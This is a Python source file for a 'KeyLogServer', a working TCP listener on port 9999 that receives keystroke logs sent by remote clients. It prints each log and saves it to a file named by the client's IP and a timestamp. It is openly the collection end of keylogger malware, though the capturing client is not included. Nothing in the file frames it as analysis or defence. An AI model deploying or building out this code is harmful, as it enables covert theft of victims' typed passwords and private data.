import socket
import os
from datetime import datetime

class KeyLogServer:
    def __init__(self, host="0.0.0.0", port=9999, save_dir="logs"):
        """
        Initialize the KeyLog Server.
        
        :param host: IP to bind the server to (default: "0.0.0.0").
        :param port: Port to bind the server to (default: 9999).
        :param save_dir: Directory to save incoming log files (default: "logs").
        """
        self.host = host
        self.port = port
        self.save_dir = save_dir
        
        # Ensure the save directory exists
        if not os.path.exists(save_dir):
            os.makedirs(save_dir)
    
    def start(self):
        """Start the KeyLog Server."""
        print(f"Starting server on {self.host}:{self.port}...")
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as server_socket:
            server_socket.bind((self.host, self.port))
            server_socket.listen(5)  # Allow up to 5 pending connections
            print("Server is listening for connections...")
            
            while True:
                conn, addr = server_socket.accept()
                print(f"New connection from {addr}")
                self.handle_client(conn, addr)

    def handle_client(self, conn, addr):
        """Handle incoming logs from a client."""
        client_log_file = os.path.join(
            self.save_dir, f"{addr[0]}_{datetime.now().strftime('%Y-%m-%d_%H-%M-%S')}.txt"
        )
        with open(client_log_file, "w") as file:
            try:
                while True:
                    data = conn.recv(1024).decode("utf-8")  # Receive logs in chunks
                    if not data:  # Connection closed
                        break
                    print(f"Log received from {addr}: {data.strip()}")
                    file.write(data)
            except Exception as e:
                print(f"Error handling client {addr}: {e}")
            finally:
                print(f"Connection with {addr} closed.")
                conn.close()


if __name__ == "__main__":
    server = KeyLogServer(host="0.0.0.0", port=9999)
    server.start()
